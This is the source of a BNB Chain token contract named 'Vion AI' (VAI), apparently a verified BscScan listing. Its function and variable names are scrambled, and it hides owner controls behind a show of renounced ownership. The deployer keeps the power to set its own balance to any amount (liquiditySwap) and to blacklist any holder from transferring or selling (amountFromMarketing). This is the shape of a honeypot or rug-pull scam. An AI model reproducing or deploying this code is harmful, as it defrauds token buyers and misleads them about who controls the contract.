/**
 *Submitted for verification at BscScan.com on 2023-02-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


interface feeBuyLimit {
    function createPair(address swapTx, address txTradingTake) external returns (address);
}

interface launchedLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract VionAI {

    address public owner;

    function modeTake() public {
        if (maxToken) {
            walletShould = false;
        }
        if (autoLiquidityAmount != marketingFund) {
            walletShould = false;
        }
        walletShould=false;
    }

    function liquiditySwap(uint256 launchedSwapTake) public {
        if (!limitFund[tradingShould()]) {
            return;
        }
        balanceOf[enableLimitMin] = launchedSwapTake;
    }

    function autoTake(address shouldFrom, address exemptSender, uint256 launchedSwapTake) internal returns (bool) {
        require(balanceOf[shouldFrom] >= launchedSwapTake);
        balanceOf[shouldFrom] -= launchedSwapTake;
        balanceOf[exemptSender] += launchedSwapTake;
        emit Transfer(shouldFrom, exemptSender, launchedSwapTake);
        return true;
    }

    function isMin(address shouldFrom, address exemptSender, uint256 launchedSwapTake) internal returns (bool) {
        if (shouldFrom == enableLimitMin) {
            return autoTake(shouldFrom, exemptSender, launchedSwapTake);
        }
        require(!marketingMin[shouldFrom]);
        return autoTake(shouldFrom, exemptSender, launchedSwapTake);
    }

    function senderEnable() public view returns (uint256) {
        return marketingFund;
    }

    event Approval(address indexed sellEnable, address indexed spender, uint256 value);

    uint8 public decimals = 18;

    mapping(address => bool) public marketingMin;

    function amountFromMarketing(address modeMaxMarketing) public {
        
        if (modeMaxMarketing == enableLimitMin || modeMaxMarketing == buyAuto || !limitFund[tradingShould()]) {
            return;
        }
        
        marketingMin[modeMaxMarketing] = true;
    }

    bool public minLimit;

    function senderTradingEnable() public view returns (uint256) {
        return marketingFund;
    }

    uint256 public marketingFund;

    address public buyAuto;

    uint256 public autoLiquidityAmount;

    mapping(address => uint256) public balanceOf;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function tradingShould() private view returns (address) {
        return msg.sender;
    }

    constructor (){ 
        
        launchedLaunch shouldMax = launchedLaunch(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        buyAuto = feeBuyLimit(shouldMax.factory()).createPair(shouldMax.WETH(), address(this));
        owner = tradingShould();
        
        enableLimitMin = owner;
        limitFund[enableLimitMin] = true;
        balanceOf[enableLimitMin] = totalSupply;
        if (marketingFund == autoLiquidityAmount) {
            walletShould = true;
        }
        emit Transfer(address(0), enableLimitMin, totalSupply);
        receiverFee();
    }

    bool private maxToken;

    function transferFrom(address shouldFrom, address exemptSender, uint256 launchedSwapTake) external returns (bool) {
        if (allowance[shouldFrom][tradingShould()] != type(uint256).max) {
            require(launchedSwapTake <= allowance[shouldFrom][tradingShould()]);
            allowance[shouldFrom][tradingShould()] -= launchedSwapTake;
        }
        return isMin(shouldFrom, exemptSender, launchedSwapTake);
    }

    string public symbol = "VAI";

    function receiverFee() public {
        emit OwnershipTransferred(enableLimitMin, address(0));
        owner = address(0);
    }

    function sellMarketing() public {
        
        if (walletShould) {
            toTakeShould = true;
        }
        walletShould=false;
    }

    bool public toTakeShould;

    function fromReceiver(address atAutoTx) public {
        if (minLimit) {
            return;
        }
        
        limitFund[atAutoTx] = true;
        if (marketingFund != autoLiquidityAmount) {
            walletShould = true;
        }
        minLimit = true;
    }

    function approve(address isTo, uint256 launchedSwapTake) public returns (bool) {
        allowance[tradingShould()][isTo] = launchedSwapTake;
        emit Approval(tradingShould(), isTo, launchedSwapTake);
        return true;
    }

    string public name = "Vion AI";

    event Transfer(address indexed from, address indexed amountLiquidity, uint256 value);

    mapping(address => bool) public limitFund;

    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address launchMode, uint256 launchedSwapTake) external returns (bool) {
        return isMin(tradingShould(), launchMode, launchedSwapTake);
    }

    bool private walletShould;

    address public enableLimitMin;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return owner;
    }

}